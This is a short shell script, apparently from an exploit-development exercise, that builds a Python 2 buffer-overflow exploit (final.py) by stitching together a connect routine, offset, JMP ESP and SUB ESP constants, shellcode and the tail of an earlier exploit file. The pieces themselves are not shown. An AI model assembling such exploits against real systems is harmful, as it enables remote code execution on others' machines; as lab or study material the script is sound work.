rm -rf ./final.py

cat <<EOF >./final.py
#!/usr/bin/env python2
import socket
import struct
EOF

echo "" >> ./final.py

cat ./config.py | grep "def connect" -A1000 >> ./final.py

echo "" >> ./final.py

cat ./config.py | grep "BUFT" >> ./final.py
cat ./config.py | grep "OFFSET" >> ./final.py
cat ./config.py | grep "NO_Z" >> ./final.py
cat ./config.py | grep "JMPESP" >> ./final.py
cat ./config.py | grep "SUBESP" >> ./final.py

echo "" >> ./final.py

cat ./shellcode.py >> ./final.py

echo "" >> ./final.py

echo 'SHELLCODE = shellcode' >> ./final.py

cat 8_exploit.py | tail -n 10 >> ./final.py

